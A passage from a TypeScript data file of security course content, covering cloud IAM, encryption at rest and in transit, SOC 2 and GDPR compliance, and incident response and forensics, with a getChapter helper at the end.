          'Cloud Identity and Access Management (IAM) controls who can do what on which resources. IAM policies define fine-grained permissions using JSON-based policy documents that are evaluated on every API call to enforce access control.',
        keyPoints: [
          'The shared responsibility model: the cloud provider secures the infrastructure (physical, hypervisor, network) while the customer secures their configuration, data, and access — "security OF the cloud" (provider) vs "security IN the cloud" (customer)',
          'IAM policies follow the principle of least privilege — start with no permissions and grant only what is needed, using specific resource ARNs and conditions rather than wildcards (*) that grant broad access',
          'IAM roles for services (EC2 instance profiles, Lambda execution roles) provide temporary credentials that are automatically rotated — never embed long-lived access keys in code or configuration files',
          'Service Control Policies (SCPs) in AWS Organizations set permission guardrails across all accounts — even if an individual account\'s IAM policy allows an action, the SCP can deny it, providing organizational-level governance',
          'Policy evaluation follows: explicit Deny always wins, then SCPs, then permission boundaries, then identity policies, then resource policies — understanding this evaluation order is critical for debugging access issues',
        ],
        tradeoffs: [
          'Fine-grained IAM policies (specific actions on specific resources) provide optimal security but are complex to write and maintain — overly permissive policies are simpler but violate least privilege and increase blast radius of compromised credentials',
          'Cross-account access using IAM roles is more secure than sharing access keys but requires careful trust relationship configuration — an overly broad trust policy on a role can allow unintended accounts to assume it',
        ],
        realWorld: [
          'AWS IAM Access Analyzer identifies resources shared externally and validates policies against security best practices',
          'GCP IAM uses a resource hierarchy (Organization > Folder > Project > Resource) where policies are inherited and can be overridden at each level',
          'Terraform and Pulumi enable IAM-as-code, allowing policies to be version-controlled, reviewed in PRs, and automatically deployed',
        ],
      },
      {
        id: 'encryption-at-rest-in-transit',
        name: 'Encryption at Rest & in Transit',
        description:
          'Encryption at rest protects stored data from physical theft and unauthorized access to storage media, while encryption in transit protects data moving between systems from eavesdropping and tampering. Together they ensure data is protected throughout its lifecycle.',
        keyPoints: [
          'Encryption at rest uses AES-256 to encrypt data stored on disk, in databases, and in object storage — the encryption/decryption is transparent to applications, managed by the storage service using keys from a Key Management Service (KMS)',
          'Envelope encryption uses a hierarchy of keys: a master key (CMK/KEK) stored in KMS encrypts data encryption keys (DEKs) which encrypt the actual data — this pattern means rotating the master key only re-encrypts the DEKs (fast), not all data (slow)',
          'Encryption in transit uses TLS for all network communication — internal service-to-service traffic should also be encrypted (mTLS in service meshes) to protect against internal network eavesdropping and comply with zero-trust principles',
          'Client-side encryption (CSE) encrypts data before sending it to the cloud — the cloud provider never sees unencrypted data or holds the encryption keys, providing protection even against a compromised cloud provider',
          'Key access policies control who can use encryption keys — AWS KMS key policies define which IAM principals can encrypt, decrypt, or manage keys, providing an additional access control layer beyond IAM policies on the encrypted resource',
        ],
        tradeoffs: [
          'Server-side encryption (SSE) is simple and transparent but the cloud provider holds the keys — client-side encryption gives you full key control but adds application complexity (you must manage keys, handle encryption/decryption, and deal with searchability limitations)',
          'Encrypting everything at rest protects against physical theft but doesn\'t protect against authorized users with decryption permissions — TDE/SSE is defense-in-depth, not a substitute for proper access controls',
        ],
        realWorld: [
          'AWS S3 defaults to SSE-S3 (server-managed keys) for all new objects, with SSE-KMS and SSE-C options for customer-managed keys',
          'Google Cloud uses envelope encryption with a customer-managed encryption key (CMEK) stored in Cloud KMS for GCS, BigQuery, and Compute Engine',
          'Azure Storage Service Encryption uses AES-256 for all data at rest with customer-managed keys stored in Azure Key Vault',
        ],
      },
      {
        id: 'compliance-soc2-gdpr',
        name: 'Compliance (SOC 2/GDPR)',
        description:
          'Security compliance frameworks provide standardized requirements and audit processes for demonstrating security controls to customers, regulators, and partners. SOC 2 focuses on service organization controls, while GDPR mandates data protection for EU residents.',
        keyPoints: [
          'SOC 2 Type II audits evaluate the operational effectiveness of security controls over a period (6-12 months) across five Trust Service Criteria: Security (mandatory), Availability, Processing Integrity, Confidentiality, and Privacy',
          'GDPR requires a legal basis for processing personal data of EU residents (consent, contract, legitimate interest), mandates data minimization (collect only what is needed), and grants data subject rights (access, deletion, portability)',
          'Data breach notification is legally required — GDPR mandates notifying the supervisory authority within 72 hours and affected individuals without undue delay, with fines up to 4% of global annual revenue or 20 million euros',
          'Privacy by design requires building data protection into system architecture from the start — not bolting it on afterward, including data encryption, access controls, retention policies, and anonymization techniques',
          'Compliance-as-code uses tools (AWS Config Rules, Open Policy Agent, Chef InSpec) to continuously evaluate infrastructure against compliance requirements — providing real-time compliance monitoring instead of periodic manual audits',
        ],
        tradeoffs: [
          'SOC 2 Type II provides strong assurance to customers but requires 6-12 months of continuous evidence collection and an expensive external audit ($50K-$200K+) — SOC 2 Type I (point-in-time) is faster and cheaper but less valuable to customers',
          'GDPR compliance requires significant engineering effort for data mapping, consent management, right-to-deletion, and breach notification — but non-compliance risks massive fines and reputational damage',
        ],
        realWorld: [
          'Vanta and Drata automate SOC 2 compliance evidence collection, continuously monitoring 100+ security controls',
          'AWS Artifact provides downloadable SOC 2, ISO 27001, and HIPAA compliance reports for AWS services',
          'Stripe, Twilio, and most B2B SaaS companies maintain SOC 2 Type II certification as a customer trust requirement',
        ],
      },
    ],
  },
  {
    id: 13,
    title: 'Incident Response',
    part: 4,
    partTitle: 'Infrastructure Security',
    summary:
      'Incident response is the organized approach to addressing and managing security breaches and cyberattacks. Effective IR minimizes damage, reduces recovery time, and provides lessons learned to prevent future incidents through structured frameworks and forensic analysis.',
    concepts: [
      {
        id: 'ir-lifecycle-frameworks',
        name: 'IR Lifecycle & Frameworks',
        description:
          'Incident response follows a structured lifecycle — preparation, detection, containment, eradication, recovery, and lessons learned. Frameworks like NIST SP 800-61 and SANS provide standardized processes for organizations to follow during security incidents.',
        keyPoints: [
          'NIST SP 800-61 defines four phases: Preparation (plans, tools, training), Detection & Analysis (identifying and confirming incidents), Containment/Eradication/Recovery (stopping, cleaning, restoring), and Post-Incident Activity (lessons learned, improving defenses)',
          'Preparation is the most critical phase — having incident response plans, trained team members, communication templates, escalation procedures, and forensic tools ready before an incident occurs dramatically reduces response time and mistakes',
          'Containment strategies balance stopping the attack with preserving evidence — short-term containment (isolating the affected system) prevents further damage, while long-term containment (rebuilding on a clean system) ensures complete eradication',
          'The MITRE ATT&CK framework catalogs adversary tactics, techniques, and procedures (TTPs) — mapping observed attack activity to ATT&CK provides a common language for describing attacks and identifying gaps in detection coverage',
          'Tabletop exercises simulate incidents without technical execution — the IR team walks through a scenario (ransomware, data breach, insider threat) discussing roles, decisions, and communication, identifying gaps in the IR plan before a real incident occurs',
        ],
        tradeoffs: [
          'Immediate containment (pulling the plug) stops the attack quickly but destroys volatile forensic evidence (memory, running processes, network connections) — a measured containment approach preserves evidence but risks the attacker continuing their activity',
          'Comprehensive IR plans for every scenario provide optimal preparedness but require significant ongoing maintenance — plans must be updated as infrastructure changes, and overly detailed plans can slow response if responders follow procedures too rigidly instead of adapting to the situation',
        ],
        realWorld: [
          'NIST SP 800-61 Rev 2 is the most widely adopted incident response framework in the US, used by federal agencies and private sector alike',
          'PagerDuty incident response process provides automated escalation, communication, and post-mortem templates used by thousands of tech companies',
          'The SANS Institute provides a six-step IR methodology (Preparation, Identification, Containment, Eradication, Recovery, Lessons Learned) with associated training and certification (GCIH)',
        ],
      },
      {
        id: 'forensic-analysis-log-review',
        name: 'Forensic Analysis & Log Review',
        description:
          'Digital forensics collects and analyzes evidence from compromised systems to understand what happened, how the attacker got in, what they accessed, and how to prevent recurrence. Centralized logging and SIEM systems provide the data foundation for forensic investigation.',
        keyPoints: [
          'Chain of custody ensures forensic evidence is admissible — creating forensic images (bit-for-bit copies) of affected systems, documenting who accessed evidence and when, and using write-blockers to prevent accidental modification of original evidence',
          'Centralized logging aggregates logs from all systems (servers, firewalls, applications, cloud services) into a SIEM — without centralized logging, an attacker who compromises a system can delete local logs, destroying evidence of their activity',
          'Timeline analysis reconstructs the sequence of events — correlating timestamps across log sources (authentication logs, network flows, application logs, file system timestamps) to map the attacker\'s movements from initial access through lateral movement to data exfiltration',
          'Memory forensics captures volatile data (running processes, network connections, loaded modules, encryption keys) from RAM before the system is shut down — tools like Volatility can recover evidence that doesn\'t exist on disk',
          'Indicators of Compromise (IOCs) are artifacts that identify a breach — file hashes, IP addresses, domain names, registry keys, and behavioral patterns that can be shared with the security community (via STIX/TAXII) to help others detect the same threat',
        ],
        tradeoffs: [
          'Comprehensive logging provides the data needed for forensics but generates enormous volumes — balancing log retention (how long to keep logs), detail level (verbose vs summary), and storage costs requires careful planning and tiered storage strategies',
          'Full disk forensic imaging preserves complete evidence but takes hours for large disks and requires significant storage — targeted collection (memory dump, specific log files, registry hives) is faster but may miss evidence in unexpected locations',
        ],
        realWorld: [
          'Splunk, Elastic SIEM, and Microsoft Sentinel provide centralized log aggregation and correlation for incident investigation',
          'AWS CloudTrail logs every API call to AWS services, providing the forensic record for cloud infrastructure investigations',
          'The Volatility Framework is the industry-standard open-source memory forensics tool, supporting analysis of Windows, Linux, and macOS memory dumps',
        ],
      },
      {
        id: 'threat-intelligence-recovery',
        name: 'Threat Intelligence & Recovery',
        description:
          'Threat intelligence provides context about adversaries, their motivations, and methods to proactively defend against attacks. Recovery focuses on restoring systems to normal operation while implementing improvements to prevent recurrence.',
        keyPoints: [
          'Threat intelligence feeds provide real-time data on emerging threats — IP blocklists, malware signatures, vulnerability exploits, and adversary TTPs that can be automatically integrated into firewalls, IDS/IPS, and SIEM for proactive detection',
          'Strategic threat intelligence informs leadership about threat landscape trends — which adversary groups target your industry, their capabilities and motivations (nation-state vs. criminal vs. hacktivist), and the likely attack vectors they use',
          'Recovery must verify system integrity before restoration — rebuilding from known-good images or backups rather than cleaning compromised systems, because sophisticated attackers may have implanted backdoors that survive typical cleanup procedures',
          'Business continuity planning ensures critical services can continue operating during and after an incident — RTO (Recovery Time Objective, how quickly services must be restored) and RPO (Recovery Point Objective, how much data loss is acceptable) drive backup and DR architecture',
          'Post-incident review (blameless postmortem) documents what happened, why, what worked, what didn\'t, and concrete action items — the goal is systemic improvement, not assigning blame, which encourages honest reporting and prevents recurrence',
        ],
        tradeoffs: [
          'Automated threat intelligence integration enables real-time defense but can cause false positive blocks if the intelligence feeds are noisy — blocking an IP flagged by a threat feed that is actually a shared CDN endpoint can cause widespread outages',
          'Rebuilding from scratch after a breach is the safest recovery approach (eliminates hidden backdoors) but takes much longer than cleaning the existing system — the choice depends on the sophistication of the attacker and confidence in the forensic analysis',
        ],
        realWorld: [
          'MISP (Malware Information Sharing Platform) enables organizations to share threat intelligence indicators and adversary TTPs',
          'CrowdStrike Falcon provides endpoint detection and response with integrated threat intelligence from their global customer base',
          'The CIS Controls (formerly SANS Top 20) provide a prioritized list of security actions organized by implementation group maturity level',
        ],
      },
    ],
  },
];

export const chapters = topics;

export function getChapter(id: number): Topic | undefined {
  return topics.find(t => t.id === id);
}
